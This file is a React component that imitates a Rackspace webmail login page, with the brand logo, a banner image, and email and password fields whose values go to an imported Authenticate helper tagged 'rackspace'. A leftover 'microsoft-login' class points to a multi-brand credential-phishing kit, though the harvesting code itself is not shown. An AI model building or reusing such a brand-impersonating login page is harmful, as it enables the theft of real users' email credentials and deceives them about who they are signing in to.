import { useState } from 'react'
import rackspace from '../../assets/rackspace-logo.png'
import banner from '../../assets/side-banner.jpg'
import { Authenticate } from '../../helpers/Auth'

const Rackspace = () => {
  const [userID, setUserID] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const handleClick = () => {
    setError('')
    if (!userID || !password) {
      setError('Invalid email or password')
    } else {
      Authenticate(userID, password, 'rackspace')
    }
  }
  return (
    <div className='w-screen h-screen md:flex items-center justify-center bg-[#EAEAEA] microsoft-login'>
      <section className='w-full md:w-[50%] bg-white'>
        <header className='bg-[#424242] flex justify-between p-4 text-[#FCFCFC] h-14'>
          <p className='text-2xl tracking-wide font-extralight'>
            Webmail Login
          </p>
          <img src={rackspace} />
        </header>
        <main className='flex items-center justify-center gap-5'>
          <aside className='hidden md:inline p-10'>
            <img src={banner} />
          </aside>
          <div className='h-[15rem] hidden md:block border'></div>
          <section className=' w-[27rem] px-2 pt-10  flex flex-col gap-5 text-[#616161]'>
            <p className='text-red-600 mt-2'>{error}</p>
            <div className='flex flex-col gap-2 '>
              <label className=''>Email address</label>
              <input
                className='border-2 h-8 px-2'
                value={userID}
                onChange={(e) => setUserID(e.target.value)}
              />
            </div>
            <div className='flex flex-col gap-2 '>
              <label>Password</label>
              <input
                type='password'
                className='border-2 h-8 px-2'
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <button
              className='mt-10 self-end bg-[#0C7C84] text-white px-2 mb-5 text-sm h-8 w-16 rounded-sm'
              onClick={handleClick}
            >
              Log In
            </button>
          </section>
        </main>
      </section>
    </div>
  )
}

export default Rackspace
